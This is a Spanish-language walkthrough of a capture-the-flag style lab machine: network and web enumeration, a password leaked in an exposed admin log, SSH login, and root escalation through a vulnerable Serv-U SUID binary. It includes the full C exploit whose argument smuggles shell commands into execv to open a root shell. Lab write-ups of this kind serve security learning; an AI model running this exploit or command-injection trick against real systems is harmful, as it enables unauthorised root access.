- Web Enumeration
- Information Leakage - Log Exposure
- Abusing SUID Binary (Serv-U FTP Server < 15.1.7) (Privilege Escalation)

URL :  https://www.youtube.com/watch?v=ut75fw5wVh0

Primero un reconocimiento

```
arp-scan -I wlan0 --localnet --ignoredups

nmap -sn 192.168.1.1/24

```
Detectamos
MAC Address: 08:00:27:8C:31:53 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for LES005773.home (==192.168.1.62==)
Host is up.

Escanemaos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.52 -oG ./nmap/allPorts
```

Escaneo mas especifico y a profundidad

```
nmap -p 22,80 -sCV  192.168.1.52 -oN nmap/Target
```

Detectar tecnologias en el puerto 80
```
whatweb http://192.168.1.52

```

Probar script de nmap, de fuzzer (muy pocas direcciones)

```
nmap --script http-enum -p80 192.168.1.52

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /robots.txt: Robots file
|   /phpinfo.php: Possible information file
|_  /phpmyadmin/: phpMyAdmin
MAC Address: 08:00:27:8C:31:53 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

```

Revisamos en la web para ver que encontramos
robots.txt
```
admin
wordpress
user
election
```

/phpinfo.php
```
Vemos la pagina de php donde esta la info del servidor de php

Aqui podemos revisar funciones deshabilitadas 

system, selected, passthru, exec

Si no estan deshabilitadas podemos pensar en subir un php para ejecutarlo y ejecutar comandos
```

/phpmyadmin
```
Acceso al panel de login de phpmyadmin
```

Directori Traversal con gobuster
```
gobuster dir -u http://192.168.1.52 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 

Encontramos otras rutas en esta direccion que vamos a explorarlas 
/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.52/javascript/]
/election             (Status: 301) [Size: 315] [--> http://192.168.1.52/election/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://192.168.1.52/phpmyadmin/]

Eploramos  http://192.168.1.52/election/     #con gobuster
/media                (Status: 301) [Size: 321] [--> http://192.168.1.52/election/media/]
/themes               (Status: 301) [Size: 322] [--> http://192.168.1.52/election/themes/]
/data                 (Status: 301) [Size: 320] [--> http://192.168.1.52/election/data/]
/admin                (Status: 301) [Size: 321] [--> http://192.168.1.52/election/admin/]
/lib                  (Status: 301) [Size: 319] [--> http://192.168.1.52/election/lib/]
/languages            (Status: 301) [Size: 325] [--> http://192.168.1.52/election/languages/]
/js                   (Status: 301) [Size: 318] [--> http://192.168.1.52/election/js/]

Eploramos  http://192.168.1.52/election/admin/     #con gobuster

/img                  (Status: 301) [Size: 325] [--> http://192.168.1.52/election/admin/img/]
/plugins              (Status: 301) [Size: 329] [--> http://192.168.1.52/election/admin/plugins/]
/css                  (Status: 301) [Size: 325] [--> http://192.168.1.52/election/admin/css/]
/ajax                 (Status: 301) [Size: 326] [--> http://192.168.1.52/election/admin/ajax/]
/js                   (Status: 301) [Size: 324] [--> http://192.168.1.52/election/admin/js/]
/components           (Status: 301) [Size: 332] [--> http://192.168.1.52/election/admin/components/]
/inc                  (Status: 301) [Size: 325] [--> http://192.168.1.52/election/admin/inc/]
/logs                 (Status: 301) [Size: 326] [--> http://192.168.1.52/election/admin/logs/]

Muy interesante  http://192.168.1.52/election/admin/logs/

Al acceder nos encontrmos con un log system.log que abrimos y vemos esto 
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logge
```

Conectamos por ssh con estos datos 
```
ssh love@192.168.1.52 

Cambiamos el TERM
export TERM=xterm

Validamos que los datos obtenidos son reales
lsb_release -a

Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic

```

Buscamos binarios con suid activo que nos permitan escalar privilegios

```
find / -perm -4000 -ls -user root 2>/dev/null

find / -perm -4000 -ls -user root 2>/dev/null | grep -v snap

Encontramos varios pero uno en paricular llama la atencion

/usr/local/Serv-U/Serv-U

Hacemos una busqueda en interner para ver que es
Y encontramos que hay una vulnerabilidad lo encontramos en Search Expliot DB y es un script de C que aparentemente nos da Privilegios elevado.

```

Script
```c
#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main()
{       
    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
    // if execv is successful, we won't reach here
    printf("ret val: %d errno: %d\n", ret_val, errno);
    return errno;
}
```

Nos vamos al directorio /tmp y nos creamos un exploit.c le copiamos este codigo dentro para compilarlo y ejecutarlos

```
gcc exploit.c -o exploit

Lo ejecutamos
./exploit

Obtenemos una nueva tty 

whoami 
#root
#bash

Y obtenemos la bash de root
```